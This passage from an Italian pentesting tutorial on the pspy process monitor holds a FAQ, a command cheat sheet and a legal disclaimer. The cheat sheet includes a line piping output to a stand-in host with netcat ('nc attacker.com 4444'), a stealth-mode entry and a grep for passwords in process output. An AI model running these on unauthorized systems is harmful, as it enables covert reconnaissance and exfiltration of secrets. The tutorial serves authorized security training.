A: `ps aux` mostra snapshot di processi running **ora**. Se un cron job esegue script che dura 0.5 secondi, potresti perderlo tra due scan di ps. pspy monitora `/proc` in realtime (ogni 100ms default) quindi cattura anche processi brevissimi. Inoltre pspy mostra argomenti completi, ps li tronca.

***

**Q: pspy funziona in container Docker?**

A: Sì ma limitato. In container vedi solo processi del container, non dell'host (namespace isolation). Utile per monitorare processi interni al container. Per vedere host processes, devi escapare dal container prima.

***

**Q: Come distinguo tra cron job e processi one-time?**

A: Osserva pattern temporale. Cron jobs ripetono a intervalli regolari:

```
21:00:01 - CMD: script.sh
21:05:01 - CMD: script.sh
21:10:01 - CMD: script.sh
# Ogni 5 minuti = cron job
```

Processi one-time appaiono una volta sola.

***

**Q: pspy è legale da usare?**

A: pspy è legale perché **legge solo informazioni pubblicamente accessibili** (`/proc`). NON richiede exploit o privilege escalation per funzionare. Tuttavia, usarlo su sistemi senza autorizzazione è **illegale** (unauthorized access). Usa SOLO in:

* Lab personali
* CTF platforms
* Pentest con contratto firmato

***

**Q: Quanto tempo devo lasciare pspy in monitoring?**

A: Dipende da frequenza cron:

* Cron ogni 1-5 min: 10-15 min monitoring
* Cron ogni ora: 1-2 ore
* Cron daily: Lascia overnight

Se non trovi nulla dopo 30 min, probabilmente non ci sono cron frequenti. Prova enumeration statica invece.

***

## 13️⃣ Cheat Sheet Finale

| **Scenario**                        | **Comando pspy**                                            |
| ----------------------------------- | ----------------------------------------------------------- |
| **Standard monitoring**             | `./pspy64`                                                  |
| **Only processes (no file events)** | `./pspy64 -p`                                               |
| **Background long-term**            | `./pspy64 -p > pspy.log 2>&1 &`                             |
| **Low resource stealth**            | `nice -n 19 ./pspy64 -i 1000 -p`                            |
| **Monitor specific directory**      | `./pspy64 -d /opt/scripts -r`                               |
| **Output to remote**                | `./pspy64 -p \| nc attacker.com 4444`                       |
| **Filter root only**                | `./pspy64 -p \| grep "UID=0"`                               |
| **Intermittent monitoring**         | `while true; do timeout 60 ./pspy64; sleep 300; done`       |
| **Alert on pattern**                | `./pspy64 \| grep --line-buffered "password" >> alerts.log` |
| **Quick 5-min check**               | `timeout 300 ./pspy64 -p`                                   |

***

## Disclaimer

pspy è uno strumento di **monitoring e security research** che legge informazioni pubblicamente accessibili del filesystem `/proc` su Linux. Non richiede privilege escalation né exploit per funzionare.

Tuttavia, l'uso di pspy su sistemi senza autorizzazione esplicita scritta del proprietario costituisce accesso non autorizzato ed è illegale in tutte le giurisdizioni.

Utilizza pspy esclusivamente in:

* Ambienti di laboratorio controllati (VM, CTF platforms, HackTheBox, TryHackMe)
* Sistemi di tua proprietà
* Engagement di penetration testing con contratto firmato e scope definito

L'autore di questo articolo e HackIta declinano ogni responsabilità per usi impropri o illegali.

**Repository ufficiale:** [https://github.com/DominicBreuker/pspy](https://github.com/DominicBreuker/pspy)

***

Vuoi supportare HackIta? Visita [hackita.it/supporto](https://hackita.it/supporto) per donazioni. Per penetration test professionali e formazione 1:1, scopri [hackita.it/servizi](https://hackita.it/servizi).
